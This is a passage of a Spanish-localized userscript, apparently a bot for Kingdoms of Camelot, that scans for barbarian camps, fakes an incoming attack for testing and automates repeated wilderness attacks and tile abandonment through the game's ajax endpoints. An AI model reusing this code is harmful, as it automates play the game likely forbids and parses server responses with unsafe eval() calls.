        m += '<TR><TD>Barbaros '+ atks[i].lvl +'</td><TD>'+ atks[i].x +','+ atks[i].y +'</td><TD> &nbsp; Dist='+ atks[i].dist.toFixed(2) +'</td></tr>';
    }
    t.popShow.getMainDiv().innerHTML = '</table></div>'+ m;
    t.popShow.getTopDiv().innerHTML = '<CENTER><B>Mostrar todos los objetivos en la memoria</b></center>';
    t.popShow.show(true);
  },

  configWriteTargets : function (cityID){
    var t = Tabs.Attack;
    var serverID = getServerId();
    DebugTimer.start();
    GM_setValue ('atk_'+ serverID +'_'+ cityID,  JSON2.stringify(t.data['city'+ cityID]));
    t.writeDiv ('** Es hora de GM_setValue() '+ t.data['city'+ cityID].numTargets +' objetivos para la ciudad: '+ (DebugTimer.getMillis()/1000) +' sgs<BR>');
  },

  oScan : {},
  scanBarbs : function (cityID, distance){   // max distance:35
    var t = Tabs.Attack;
    var city = Cities.byID[cityID];
// TODO: remember state - in case of refresh
    var x = t.MapAjax.normalize(city.x-distance);
    var y = t.MapAjax.normalize(city.y-distance);
    t.oScan = { city:city, centerX:city.x, centerY:city.y, maxDist:distance,
        minX:x, maxX:city.x+distance, minY:y, maxY:city.y+distance, curX:x, curY:y, data:[] };
    setTimeout (function(){t.MapAjax.request (t.oScan.curX, t.oScan.curY, 15, t.e_mapCallback)}, MAP_DELAY);
    t.writeDiv ('Scanning @ '+ t.oScan.curX +','+ t.oScan.curY +'<BR>');
  },

  e_scanDone : function (errMsg){
    var t = Tabs.Attack;
    t.data['city'+ t.oScan.city.id] = {cityX:t.oScan.city.x, cityY:t.oScan.city.y, radius:t.oScan.maxDist, numTargets:0, targets:{}};
    var dat = t.data['city'+ t.oScan.city.id];
    t.writeDiv ('Haciendo scaneo<BR>');
    for (var i=0; i<t.oScan.data.length; i++){
      var map = t.oScan.data[i];
      dat.targets[map[0] +'_'+ map[1]] = {type:'b', x:map[0], y:map[1], dist:map[2], lvl:map[3]};
      ++dat.numTargets;
    }
    t.configWriteTargets (t.oScan.city.id);
  },

  e_mapCallback : function (left, top, width, rslt){
    var t = Tabs.Attack;
    if (!rslt.ok){
      setTimeout (function(){t.e_scanDone (rslt.errorMsg)}, 0);
      t.writeDIV ('<BR>ERROR: '+ rslt.errorMsg +'<BR>');
      return;
    }
    var map = rslt.data;
    for (k in map){
      var lvl = parseInt(map[k].tileLevel);
      if (map[k].tileType==51 && !map[k].tileCityId && lvl<8) {  // if barb
        var dist = distance (t.oScan.centerX, t.oScan.centerY, map[k].xCoord, map[k].yCoord);
        if (dist <= t.oScan.maxDist){
          t.oScan.data.push ([parseInt(map[k].xCoord), parseInt(map[k].yCoord), dist, lvl]);
        }
      }
    }
    t.oScan.curX += 15;
    if (t.oScan.curX > t.oScan.maxX){
      t.oScan.curX = t.oScan.minX;
      t.oScan.curY += 15;
      if (t.oScan.curY > t.oScan.maxY){
        setTimeout (function(){t.e_scanDone (null)}, 0);
        return;
      }
    }
    var x = t.oScan.curX;
    var y = t.oScan.curY;
    setTimeout (function(){t.MapAjax.request (x,y, 15, t.e_mapCallback)}, MAP_DELAY);
    t.writeDiv ('Scaneando @ '+ x +','+ y +'<BR>');
  },
}


/*********************************** Test TAB ***********************************/
Tabs.Test = {
  tabOrder: 25,
  tabDisabled : !ENABLE_TEST_TAB,         // if true, tab will not be added or initialized
  tabLabel : 'Test',
  myDiv : null,

  init : function (div){
    var t = Tabs.Test;
    t.myDiv = div;
    var m = '<TABLE><TR><TD align=right>Scout: </td><TD><INPUT type=checkbox id=pbfakeIsScout></td></tr>\
        <TR><TD align=right>Wild: </td><TD><INPUT type=checkbox id=pbfakeIsWild></td></tr>\
        <TR><TD align=right>False Report: </td><TD><INPUT type=checkbox id=pbfakeFalse></td></tr>\
        <TR><TD align=right>Seconds: </td><TD><INPUT type=text size=4 value=300 id=pbfakeSeconds></td></tr>\
        <TR><TD align=right># of Militia: </td><TD><INPUT type=text size=6 value=5000 id=pbfakeMilitia></td></tr>\
        <TR><TD colspan=2 align=center><INPUT id=pbtestSendMarch type=submit value="Fake Attack" \></td></tr></table>\
        <INPUT id=pbReloadKOC type=submit value="Reload KOC" \>\
        <BR>Force ajax errors : <INPUT type=checkbox id=pbajaxErr>\
        <BR>Send alliance chat alert as whisper : <INPUT type=checkbox id=pbalertWhisper>\
        <BR><DIV id=pbtestDiv style="background-color:#ffffff; maxwidth:675; maxheight:350px; height:350px; overflow-y:auto;"></div>';
    div.innerHTML = m;
    document.getElementById('pbtestSendMarch').addEventListener ('click', t.clickFakeAttack, false);
   document.getElementById('pbReloadKOC').addEventListener ('click', reloadKOC, false);
    document.getElementById('pbajaxErr').addEventListener ('click', function (){window.EmulateAjaxError=this.checked}, false);
   document.getElementById('pbalertWhisper').addEventListener ('click', function (){SEND_ALERT_AS_WHISPER=this.checked}, false);
 },

  hide : function (){
    var t = Tabs.Test;
  },

  show : function (){
  },

  writeDiv : function (msg){
    var t = Tabs.Test;
    document.getElementById('pbtestDiv').innerHTML = msg;
  },

  addDiv : function (msg){
    var t = Tabs.Test;
    document.getElementById('pbtestDiv').innerHTML += msg;
  },

  createFakeAttack : function (cityNum, isScout, isWild, isFalse, secs, numMilitia){
    var marchId = 'm'+ (88888 + Math.floor(Math.random()*11111));
    var march = {};
    if (matTypeof(Seed.queue_atkinc)=='array')
      Seed.queue_atkinc = {};
    if (isFalse)
      march.marchType = 0;
    else if (isScout)
      march.marchType = 3;
    else
      march.marchType = 4;

    march.toCityId = Cities.cities[cityNum].id;
    if (isWild) {
      keys = unsafeWindow.Object.keys(Seed.wilderness['city'+Cities.cities[cityNum].id]);
      march.toTileId = Seed.wilderness['city'+Cities.cities[cityNum].id][keys[0]].tileId;
    } else {
      march.toTileId = Cities.cities[cityNum].tileId;
    }
    secs = parseInt(secs);
    march.arrivalTime = unixTime() + secs;
    march.departureTime = unixTime() - 10;
    march.unts = {}
    march.unts.u3 = 1
    march.unts.u2 = numMilitia
    march.pid = 1234567
    march.score = 9
    march.mid = marchId.substr(1);
    march.players = {}
    march.players.u1234567 = {}
    march.players.u1234567.n = 'Fred Flintstone';
    march.players.u1234567.t = 60
    march.players.u1234567.m = 5441192
    march.players.u1234567.s = 'M';
    march.players.u1234567.w = 1
    march.players.u1234567.a = 1
    march.players.u1234567.i = 5
    Seed.queue_atkinc[marchId] = march;
    Seed.players.u1234567 = march.players.u1234567;
  },

  clickFakeAttack : function (){
    var t = Tabs.Test;
    var isScout = document.getElementById('pbfakeIsScout').checked;
    var isWild = document.getElementById('pbfakeIsWild').checked;
    var isFalse = document.getElementById('pbfakeFalse').checked;
    var secs = parseInt(document.getElementById('pbfakeSeconds').value);
    var mil = parseInt(document.getElementById('pbfakeMilitia').value);
    t.createFakeAttack (0, isScout, isWild, isFalse, secs, mil);
  },
}

/*********************************  Cresting Tab ***********************************/
 Tabs.Crest = {
  tabOrder : 1,
  tabLabel: 'Tierras',
  myDiv : null,
  rallypointlevel:null,
  error_code: 0,
  knt:{},

  init : function (div){
    var t = Tabs.Crest;
    setInterval(t.FirstRound,10000);
    setInterval(t.sendCrestReport, 1*60*1000);
    t.myDiv = div;
    var selbut=0;
    var m = '<DIV id=pbTowrtDivF class=pbStat>FUNCION AUTOMATICA DE TIERRAS</div><TABLE id=pbcrestfunctions width=100% height=0% class=pbTab><TR align="center">';
     if (CrestOptions.Running == false) {
	       m += '<TD><INPUT id=Cresttoggle type=submit value="Tierras = OFF"></td>';
	   } else {
	       m += '<TD><INPUT id=Cresttoggle type=submit value="Tierras = ON"></td>';
	   }
    m += '<TD><INPUT id=CrestHelp type=submit value="Ayuda"></td></table>';

    m += '<DIV id=pbOpt class=pbStat>OPCIONES de TIERRAS</div><TABLE id=pbcrestopt	 width=100% height=0% class=pbTab><TR align="center"></table>';
    m += '<DIV style="margin-bottom:10px;">Tierras de la ciudad: <span id=crestcity></span></div>';
    m +='<TD><INPUT id=deletes0togglewild type=checkbox '+(CrestOptions.DeleteMsgswild?'CHECKED':'')+' /> Auto borrar informes de ataques a tierras</td></tr>';

	m += '<TABLE class=ptTab><TR><TD>Coordenadas: X:<INPUT id=pbcrestx type=text size=3 maxlength=3 value="'+CrestOptions.X+'"</td>';
  m += '<TD>Y:<INPUT id=pbcresty type=text size=3 maxlength=3 value="'+CrestOptions.Y+'"</td></tr></table>';

    m += '<TABLE class=ptTab><TR><TD>Primera Oleada: </td><TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_30.png></td><TD><INPUT id=R1MM type=text size=5 maxlength=5 value="'+CrestOptions.R1MM+'" (Si dejamos a 0 no enviará una primera ola, a elección del jugador...)</td>';
    m += '</td><TD></td><TD><TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_30.png></td><TD><INPUT id=R1Ball type=text size=5 maxlength=5 value="'+CrestOptions.R1Ball+'"</td>';
    m += '<TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_30.png></td><TD><INPUT id=R1Cat type=text size=5 maxlength=5 value="'+CrestOptions.R1Cat+'"</td></tr>';

    m += '<TR><TD>Segunda Oleada: </td><TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_30.png></td><TD><INPUT id=R2MM type=text size=5 maxlength=5 value="'+CrestOptions.R2MM+'"</td>';
    m += '<TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_30.png></td><TD><INPUT id=R2Pike type=text size=5 maxlength=5 value="'+CrestOptions.R2Pike+'"</td>';
    m += '<TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_30.png></td><TD><INPUT id=R2Sword type=text size=5 maxlength=5 value="'+CrestOptions.R2Sword+'"</td>';
	m += '<TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_30.png></td><TD><INPUT id=R2Arch type=text size=5 maxlength=5 value="'+CrestOptions.R2Arch+'"</td>';
    m += '<TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_30.png></td><TD><INPUT id=R2Ball type=text size=5 maxlength=5 value="'+CrestOptions.R2Ball+'"</td>';
    m += '<TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_30.png></td><TD><INPUT id=R2Ram type=text size=5 maxlength=5 value="'+CrestOptions.R2Ram+'"</td>';
	m += '<TD><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_30.png></td><TD><INPUT id=R2Cat type=text size=5 maxlength=5 value="'+CrestOptions.R2Cat+'"</td></tr></table>';

    t.myDiv.innerHTML = m;

    for (var i=0;i<Seed.cities.length;i++){
		if (CrestOptions.CrestCity == Seed.cities[i][0]){
			selbut=i;
			break;
		}
	}

    t.tcp = new CdispCityPicker ('crestcityselect', document.getElementById('crestcity'), true, t.clickCitySelect, selbut);

    if (CrestOptions.CrestCity == 0) {
    	CrestOptions.CrestCity = t.tcp.city.id
    	saveCrestOptions();
    }

    document.getElementById('deletes0togglewild').addEventListener('change', function(){CrestOptions.DeleteMsgswild=document.getElementById('deletes0togglewild').checked; saveCrestOptions();},false);
	document.getElementById('crestcity').addEventListener('click', function(){CrestOptions.CrestCity = t.tcp.city.id;saveCrestOptions();} , false);
    document.getElementById('Cresttoggle').addEventListener('click', function(){t.toggleCrestState(this)} , false);
    document.getElementById('CrestHelp').addEventListener('click', function(){t.helpPop();} , false);
    document.getElementById('pbcrestx').addEventListener('change', function(){CrestOptions.X= document.getElementById('pbcrestx').value; saveCrestOptions();} , false);
    document.getElementById('pbcresty').addEventListener('change', function(){CrestOptions.Y= document.getElementById('pbcresty').value; saveCrestOptions()} , false);
    document.getElementById('R1MM').addEventListener('change', function(){CrestOptions.R1MM= document.getElementById('R1MM').value; saveCrestOptions()} , false);
    document.getElementById('R1Ball').addEventListener('change', function(){CrestOptions.R1Ball= document.getElementById('R1Ball').value; saveCrestOptions()} , false);
    document.getElementById('R1Cat').addEventListener('change', function(){CrestOptions.R1Cat= document.getElementById('R1Cat').value; saveCrestOptions()} , false);
    document.getElementById('R2MM').addEventListener('change', function(){CrestOptions.R2MM= document.getElementById('R2MM').value; saveCrestOptions()} , false);
    document.getElementById('R2Pike').addEventListener('change', function(){CrestOptions.R2Pike = document.getElementById('R2Pike').value; saveCrestOptions()} , false);
    document.getElementById('R2Sword').addEventListener('change', function(){CrestOptions.R2Sword = document.getElementById('R2Sword').value; saveCrestOptions()} , false);
	document.getElementById('R2Arch').addEventListener('change', function(){CrestOptions.R2Arch= document.getElementById('R2Arch').value; saveCrestOptions()} , false);
    document.getElementById('R2Ball').addEventListener('change', function(){CrestOptions.R2Ball= document.getElementById('R2Ball').value; saveCrestOptions()} , false);
    document.getElementById('R2Ram').addEventListener('change', function(){CrestOptions.R2Ram = document.getElementById('R2Ram').value; saveCrestOptions()} , false);
	document.getElementById('R2Cat').addEventListener('change', function(){CrestOptions.R2Cat= document.getElementById('R2Cat').value; saveCrestOptions()} , false);
  },

  helpPop : function (){
    var helpText = '<BR>Está diseñado para atacar las tierras repetidas veces.<BR>';
    helpText += 'En este momento sólo se pueden entrar coord de tierras y seleccionar una ciudad para la tierra. Elija a sus tropas para mandar .<BR>';
	helpText += 'a la tierra. Asegúrese de tener un espacio vacío para conquista /o abandono para el ataque de tierras, es lo mejor para el método<BR>';
	helpText += 'de tierras que hemos implementado por ahora. Si el último ataque a la tierra fue hace menos de 5 minutos, powerbot enviará el 10% <BR>';
	helpText += 'de la "onda completa" para conservar las tropas suicidas el al maximo. Así que no cunda el pánico si el segundo grupo sólo tiene un<BR>';
	helpText += '29MM, en comparación con un 299MM. Se recomienda apagar el automatico de barbaros al usar el de tierras, aunque es posible eliminar <BR>';
	helpText += 'la selección de una sola ciudad en barbaros, y dejar los barbaros del resto de ciudades* (No se ha probado esta idea todavía)..<BR>';

	helpText += 'La tierra sera atacada en 2 oleadas, abandonada y vuelta a atacar.<BR>';
    helpText += 'debes tener un espacio de tierras libre en el castillo!<BR>';
    helpText += 'Sólo tienes que rellenar las coordenadas, las tropas y pulsar en "ON".<BR><BR>';
    helpText += 'Puedes encontrar mas información en Koc Wikia:<BR>';
    helpText += '<A target="_tab" href="http://andalusies.no-ip.biz/kofc/guia_ataques.php">Guia sobre numero de tropas (orientativa)</a>';
    helpText += '<TABLE width=100%><TR><TD>Level</td><TD>Oleada 1</td><TD>Oleada 2</td><TD>Perdida de tropas</td><TD>Min. Inves de Flechas</td></tr>';
    helpText += '<TR><TD>1</td><TD>n/a</td><TD>160 MM</td><TD>12 MM</td><TD>0</td></tr>';
    helpText += '<TR><TD>1</td><TD>n/a</td><TD>80 arqueros</td><TD>Ninguno</td><TD>1+</td></tr>';
    helpText += '<TR><TD>2</td><TD>5 MM</td><TD>130 arqueros</td><TD>1st Oleada</td><TD>2+</td></tr>';
    helpText += '<TR><TD>3</td><TD>10 MM</td><TD>520 arqueros</td><TD>1st Oleada</td><TD>3+</td></tr>';
    helpText += '<TR><TD>4</td><TD>20 MM</td><TD>1600 arqueros</td><TD>1st Oleada</td><TD>4+</td></tr>';
    helpText += '<TR><TD>5</td><TD>50 MM</td><TD>2200 arqueros</td><TD>1st Oleada</td><TD>6+</td></tr>';
    helpText += '<TR><TD>6</td><TD>100 MM</td><TD>3000 arqueros</td><TD>1st Oleada</td><TD>7+</td></tr>';
    helpText += '<TR><TD>7</td><TD>150 MM</td><TD>6000 arqueros</td><TD>1st Oleada</td><TD>8+</td></tr>';
    helpText += '<TR><TD>8</td><TD>299 MM + 1Ball.</td><TD>9000 arqueros + 900 Ball.</td><TD>1st Oleada + 1 arqueros</td><TD>9+</td></tr>';
    helpText += '<TR><TD>9</td><TD>599 MM + 1Ball.</td><TD>13000 arqueros + 900 Ball.</td><TD>1st Oleada + 2 arqueros</td><TD>10</td></tr>';
    helpText += '<TR><TD>10</td><TD>1199 MM + 1Cata.</td><TD>35000 arqueros + 2500 Cata.</td><TD>1st Oleada + 6 arqueros + 50 Cata.</td><TD>10</td></tr></table>';

    var pop = new CPopup ('giftHelp', 0, 0, 785, 530, true);
    pop.centerMe (mainPop.getMainDiv());
    pop.getMainDiv().innerHTML = helpText;
    pop.getTopDiv().innerHTML = '<CENTER><B>Ayuda Menu Power Bot: Tierras</b></center>';
    pop.show (true);
  },

  toggleCrestState: function(obj){
		var t = Tabs.Crest;
        if (CrestOptions.Running == true) {
            CrestOptions.Running = false;
            obj.value = "Tierras = OFF";
            saveCrestOptions();
        }
        else {
            CrestOptions.Running = true;
            obj.value = "Tierras = ON";
            sendCrestReport();
            saveCrestOptions();
        }
    },

    sendCrestReport: function(){
    	var t = Tabs.Crest;
    	if(!Options.crestreport || !CrestOptions.Running) return;
    	var now = new Date().getTime()/1000.0;
        now = now.toFixed(0);
        if (now < (parseInt(Options.LastCrestReport)+(Options.CrestMsgInterval*60*60))) return;

    	var total = 0;
        var message = 'Estadisticas de tierras: %0A';
        message += '%0A Tierras ganadas (durante '+ Options.CrestMsgInterval +' horas de ataques) %0A';
        for (crest in Options.Creststatus){
        	owned = Seed.items['i'+crest];
        	if (owned == undefined) owned=0;
	      	if ( (owned - Options.Creststatus[crest]) > 0) message+= '<DIV><B>' + unsafeWindow.itemlist['i'+crest]['name'] +': '+ (owned - Options.Creststatus[crest]) +'%0A </b></div>';
	      	else message+= unsafeWindow.itemlist['i'+crest]['name'] +': '+ (owned - Options.Creststatus[crest]) +'%0A';
	    	total += (owned - Options.Creststatus[crest]);
	    	Options.Creststatus[crest] = owned;
      	}
    	message += '%0A Total tierras ganadas: '+ total +'%0A';

      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      params.emailTo = Seed.player['name'];
      params.subject = "Crest Overview";
      params.message = message;
      params.requestType = "COMPOSED_MAIL";
      new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getEmail.php" + unsafeWindow.g_ajaxsuffix, {
          method: "post",
          parameters: params,
          onSuccess: function (message) {
              var rslt = eval("(" + message.responseText + ")");
              if (rslt.ok) {
              		Options.LastCrestReport = now;
              } else {
              }
          },
          onFailure: function () {
          },
      });

      saveOptions();
    },
    

    getAtkKnight : function(cityID){
     var t = Tabs.Crest;
     t.knt = new Array();
     for (k in Seed.knights[cityID]){
     		if (Seed.knights[cityID][k]["knightStatus"] == 1 && Seed.leaders[cityID]["resourcefulnessKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["politicsKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["combatKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["intelligenceKnightId"] != Seed.knights[cityID][k]["knightId"]){
     			t.knt.push ({
     				Name:   Seed.knights[cityID][k]["knightName"],
     				Combat:	parseInt(Seed.knights[cityID][k]["combat"]),
     				ID:		Seed.knights[cityID][k]["knightId"],
     			});
     		}
     }
     t.knt = t.knt.sort(function sort(a,b) {a = a['Combat'];b = b['Combat'];return a == b ? 0 : (a > b ? -1 : 1);});
  },

  getRallypointLevel: function(cityId){
    var t = Tabs.Crest;
    for (var o in Seed.buildings[cityId]){
  	var buildingType = parseInt(Seed.buildings[cityId][o][0]);
  	var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
  	if (buildingType == 12) t.rallypointlevel=parseInt(buildingLevel);
     }
  },


  FirstRound: function(){
      var t = Tabs.Crest;
      var buzy = false;
      if (!CrestOptions.Running) return;
      cityID = 'city' + CrestOptions.CrestCity;
      var abandon=0;
      for (var k in Seed.wilderness[cityID] ){
           if (Seed.wilderness[cityID][k]['xCoord']==CrestOptions.X && Seed.wilderness[cityID][k]['yCoord']==CrestOptions.Y && t.error_code!=401) {
             t.abandonWilderness(Seed.wilderness[cityID][k]['tileId'],Seed.wilderness[cityID][k]['xCoord'],Seed.wilderness[cityID][k]['yCoord'],CrestOptions.CrestCity);
           }
      }
      if (parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R1Ball || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R1Cat || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R2MM || parseInt(Seed.units[cityID]['unt4']) < CrestOptions.R2Pike || parseInt(Seed.units[cityID]['unt5']) < CrestOptions.R2Sword || parseInt(Seed.units[cityID]['unt6']) < CrestOptions.R2Arch || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R2Ball || parseInt(Seed.units[cityID]['unt11']) < CrestOptions.R2Ram || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R2Cat) return;
      for (var k in Seed.queue_atkp[cityID]){
        if (Seed.queue_atkp[cityID][k]['toXCoord']==CrestOptions.X && Seed.queue_atkp[cityID][k]['toYCoord']==CrestOptions.Y)  buzy=true;
      }
      if (!buzy)  {
        CrestOptions.RoundOne=true;
        CrestOptions.RoundTwo=true;
        saveCrestOptions();
      }
      if(!CrestOptions.RoundOne) return;

	  if (CrestOptions.R1MM == 0 && CrestOptions.R1Ball==0 && CrestOptions.R1Cat==0){
      CrestOptions.RoundOne = false;
      saveCrestOptions();
      setTimeout (function(){t.SecondRound();}, 1000);
      return;
      }

      t.getAtkKnight(cityID);
      slots=0;
       for (z in Seed.queue_atkp[cityID]){
             slots++;
       }
       if  (Seed.queue_atkp[cityID].toSource() == "[]") slots=0;
       t.getRallypointLevel(cityID);
       if ((t.rallypointlevel) <= slots)return;

       if  (t.knt.toSource() == "[]") {return;}
       var kid = t.knt[0].ID;

       var now = new Date().getTime()/1000.0;
       now = now.toFixed(0)

	   if (CrestOptions.R1MM > parseInt(Seed.units[cityID]['unt2']) || CrestOptions.R1Ball > parseInt(Seed.units[cityID]['unt10']) || CrestOptions.R1Cat > parseInt(Seed.units[cityID]['unt12'])){return;}
       if (CrestOptions.R2MM > parseInt(Seed.units[cityID]['unt2']) || CrestOptions.R2Ball > parseInt(Seed.units[cityID]['unt10']) || CrestOptions.R2Pike > parseInt(Seed.units[cityID]['unt4']) || CrestOptions.R2Sword > parseInt(Seed.units[cityID]['unt5']) || CrestOptions.R2Arch > parseInt(Seed.units[cityID]['unt6']) || CrestOptions.R2Ram > parseInt(Seed.units[cityID]['unt11']) || CrestOptions.R2Cat > parseInt(Seed.units[cityID]['unt12'])){return;}

		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  		params.cid=CrestOptions.CrestCity;
  		params.type=4;
  	    params.kid=kid;
  		params.xcoord = CrestOptions.X;
  		params.ycoord = CrestOptions.Y;
        if (now < (parseInt(CrestOptions.lastRoundTwo) + 300)) {
        	params.u2= (CrestOptions.R1MM / 6);
        	params.u2 = params.u2.toFixed(0);
        	if (params.u2 < (CrestOptions.R1MM / 6)) params.u2++;
        } else	if (now > (parseInt(CrestOptions.lastRoundTwo) + 300) && now < (parseInt(CrestOptions.lastRoundTwo) + 540)) {
        	params.u2= (CrestOptions.R1MM / 4);
        	params.u2 = params.u2.toFixed(0);
        	if (params.u2 < (CrestOptions.R1MM / 4)) params.u2++;
        }
  		else params.u2= CrestOptions.R1MM;
  		params.u10=CrestOptions.R1Ball;
  		params.u12=CrestOptions.R1Cat;

  		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
  		         loading: true,
  		         onSuccess: function (transport) {
  		         var rslt = eval("(" + transport.responseText + ")");
  		         if (rslt.ok) {
  		         var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
  		         var ut = unsafeWindow.unixtime();
  		         var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
  		         var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
  		         for(i = 0; i <= unitsarr.length; i++){
  		         	if(params["u"+i]){
  		         	unitsarr[i] = params["u"+i];
  		         	}
  		         }
  		         var currentcityid = params.cid;
  		         unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
  		         unsafeWindow.update_seed(rslt.updateSeed)
  		         if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
  		         CrestOptions.RoundOne = false;
  		         Options.Crest1Count++;
  		         Options.CrestLevel = rslt.tileLevel;
  		         Options.CrestType = rslt.tileType;
  		         saveCrestOptions();
  		         setTimeout (function(){t.SecondRound();}, 10000);
               } else {
               		//setTimeout (function(){t.FirstRound();}, 5000);
  		         //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
  		         }
  		         },
  		         onFailure: function () {}
  		 });

  	 },


    SecondRound: function(){
      var t = Tabs.Crest;
      if (!CrestOptions.Running || !CrestOptions.RoundTwo) return;
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      cityID = 'city' + CrestOptions.CrestCity;
      if (parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R1Ball || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R1Cat || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R2MM || parseInt(Seed.units[cityID]['unt4']) < CrestOptions.R2Pike || parseInt(Seed.units[cityID]['unt5']) < CrestOptions.R2Sword || parseInt(Seed.units[cityID]['unt6']) < CrestOptions.R2Arch || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R2Ball || parseInt(Seed.units[cityID]['unt11']) < CrestOptions.R2Ram || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R2Cat) return;

	  t.getAtkKnight(cityID);
      slots=0;
       for (z in Seed.queue_atkp[cityID]){
             slots++;
       }
       if  (Seed.queue_atkp[cityID].toSource() == "[]") slots=0;
       t.getRallypointLevel(cityID);
       if ((t.rallypointlevel) <= slots)return;

       if  (t.knt.toSource() == "[]") {return;}
       var kid = t.knt[0].ID;

  		params.cid=CrestOptions.CrestCity;
  		params.type=4;
  	  params.kid=kid;
  		params.xcoord = CrestOptions.X;
  		params.ycoord = CrestOptions.Y;
  		params.u2=CrestOptions.R2MM;
  		params.u4=CrestOptions.R2Pike;
  		params.u5=CrestOptions.R2Sword;
  		params.u6=CrestOptions.R2Arch;
  		params.u10=CrestOptions.R2Ball;
  		params.u11=CrestOptions.R2Ram;
  		params.u12=CrestOptions.R2Cat;

  		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
  		         loading: true,
  		         onSuccess: function (transport) {
  		         var rslt = eval("(" + transport.responseText + ")");
  		         if (rslt.ok) {
  		         var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
  		         var ut = unsafeWindow.unixtime();
  		         var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
  		         var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
  		         for(i = 0; i <= unitsarr.length; i++){
  		         	if(params["u"+i]){
  		         	unitsarr[i] = params["u"+i];
  		         	}
  		         }
  		         var currentcityid = params.cid;
  		         unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
  		         unsafeWindow.update_seed(rslt.updateSeed);
  		         if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
  		         CrestOptions.RoundTwo = false;
               var now = new Date().getTime()/1000.0;
               now = now.toFixed(0);
               CrestOptions.lastRoundTwo = now;
               Options.Crest2Count++;
  		         saveCrestOptions();
               } else {
               setTimeout (function(){t.SecondRound();}, 5000);
  		         //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
  		         }
  		         },
  		         onFailure: function () {}
  		 });
  		 },


  	abandonWilderness: function(tid,x,y,cid){
      var t = Tabs.Crest;
      if (!CrestOptions.Running) return;
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      var cityID = cid;
	  var tileid = tid;
      params.tid=tid;
  		params.cid=cid;
  	  params.x=x;
  		params.y=y;

  		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/abandonWilderness.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
  		         loading: true,
  		         onSuccess: function (transport) {
  		         var rslt=eval("("+transport.responseText+")");


				  if (rslt.ok) {
				     t.error_code = 0;
				     CrestOptions.RoundOne = true;
				     CrestOptions.RoundTwo = true;
				     saveCrestOptions();
				      if (rslt.returningMarches) {
				          var cities = Object.keys(rslt.returningMarches);
				          for (var i = 0; i < cities.length; i++) {
				              for (var j = 0; j < rslt.returningMarches[cities[i]].length; j++) {
				                  var cid = cities[i].split("c")[1];
				                  var mid = rslt.returningMarches[cities[i]][j];
				                  var march = Seed.queue_atkp["city" + cid]["m" + mid];
				                  if (march) {
				                      var marchtime = Math.abs(parseInt(march.destinationUnixTime) - parseInt(march.marchUnixTime));
				                      var ut = unsafeWindow.unixtime();
				                      Seed.queue_atkp["city" + cid]["m" + mid].destinationUnixTime = ut;
				                      Seed.queue_atkp["city" + cid]["m" + mid].marchUnixTime = ut - marchtime;
				                      Seed.queue_atkp["city" + cid]["m" + mid].returnUnixTime = ut + marchtime;
				                      Seed.queue_atkp["city" + cid]["m" + mid].marchStatus = 8
				                  }
				              }
				          }
				      }
				      if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};

